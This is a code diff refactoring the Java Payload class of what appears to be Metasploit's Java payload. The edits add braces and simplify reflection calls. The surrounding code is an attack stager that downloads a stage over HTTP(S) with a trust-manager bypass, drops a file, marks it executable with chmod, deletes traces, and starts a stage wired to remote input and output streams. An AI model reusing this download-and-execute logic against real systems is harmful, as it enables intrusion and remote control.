@@ -138,8 +138,9 @@ public class Payload extends ClassLoader {
             };
             for (int i = 0; i < files.length; i++) {
                 for (int j = 0; j < 10; j++) {
-                    if (files[i].delete())
+                    if (files[i].delete()) {
                         break;
+                    }
                     files[i].deleteOnExit();
                     Thread.sleep(100);
                 }
@@ -151,7 +152,7 @@ public class Payload extends ClassLoader {
             if (!IS_DOS) {
                 try {
                     try {
-                        File.class.getMethod("setExecutable", new Class[]{boolean.class}).invoke(droppedFile, new Object[]{Boolean.TRUE});
+                        File.class.getMethod("setExecutable", new Class[]{boolean.class}).invoke(droppedFile, Boolean.TRUE);
                     } catch (NoSuchMethodException ex) {
                         // ok, no setExecutable method, call chmod and wait for it
                         Runtime.getRuntime().exec(new String[]{"chmod", "+x", droppedExecutable}).waitFor();
@@ -186,13 +187,14 @@ public class Payload extends ClassLoader {
             } else if (url != null) {
                 if (url.startsWith("raw:"))
                     // for debugging: just use raw bytes from property file
+                {
                     in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
-                else if (url.startsWith("http")) {
+                } else if (url.startsWith("http")) {
                     URLConnection uc = new URL(url).openConnection();
                     // load the trust manager via reflection, to avoid loading
                     // it when it is not needed (it requires Sun Java 1.4+)
                     if (url.startsWith("https:")) {
-                        Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
+                        Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, uc);
                     }
                     addRequestHeaders(uc, props);
                     in = uc.getInputStream();
@@ -277,7 +279,7 @@ public class Payload extends ClassLoader {
                 clazz = Class.forName("javapayload.stage." + embeddedStageName);
             }
             final Object stage = clazz.newInstance();
-            clazz.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, String[].class}).invoke(stage, new Object[]{in, out, stageParameters});
+            clazz.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, String[].class}).invoke(stage, in, out, stageParameters);
         } catch (final Throwable t) {
             t.printStackTrace(new PrintStream(out));
         }
